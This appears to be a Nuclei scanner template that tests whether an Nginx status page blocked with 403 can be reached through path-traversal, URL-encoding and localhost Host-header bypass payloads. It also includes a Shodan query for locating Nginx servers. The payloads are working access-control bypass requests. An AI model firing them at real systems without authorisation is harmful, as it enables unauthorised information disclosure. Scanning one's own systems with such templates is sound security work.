id: nginx-status-403-bypass
info:
  name: Nginx Status Page - 403 Bypass
  author: pussycat0x
  severity: low
  description: |
    Detected an NGINX status disclosure and a 403 bypass that allowed unauthorized access to the /nginx_status endpoint.
  reference:
    - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx
  classification:
    cwe-id:
      - CWE-22
  metadata:
    shodan-query: server:nginx
    verified: true
  tags: bypass,disclosure,misconfig,nginx,status
flow: http(1) && (http(2) || http (3))
http:
  - matchers:
      - dsl:
          - status_code == 403
        internal: true
        type: dsl
    method: GET
    path:
      - '{{BaseURL}}/nginx_status'
  - attack: clusterbomb
    matchers:
      - condition: and
        dsl:
          - status_code == 200
          - contains(body, "Active connections:")
        type: dsl
    method: GET
    path:
      - '{{BaseURL}}{{paths}}'
    payloads:
      paths:
        - /../nginx_status
        - /./nginx_status
        - /.//nginx_status
        - /./..;/nginx_status
        - /%2e%2e/nginx_status
        - /./%252e%252e/nginx_status
        - /./%6e%67%69%6e%78_%73%74%61%74%75%73
        - /;/nginx_status
        - /./?/nginx_status
        - /./nginx_status;
        - /./nginx_status%20
        - /./nginx_status/
    stop-at-first-match: true
  - matchers:
      - condition: and
        # digest: 4a0a00473045022100dfd848ecc70909cd1d833ea5051419a90b3fffe0fa3be5cd7a5b338277caecb402204e75641d67e37ed61daebaba3b336e03f17c1493e9ee34515b038cb467575651:922c64590222798bb761d5b6d8e72950

        dsl:
          - status_code == 200
          - contains(body, "Active connections:")
        type: dsl
    raw:
      - |
        @Host: localhost
        GET /nginx_status HTTP/1.1
        Host: localhost
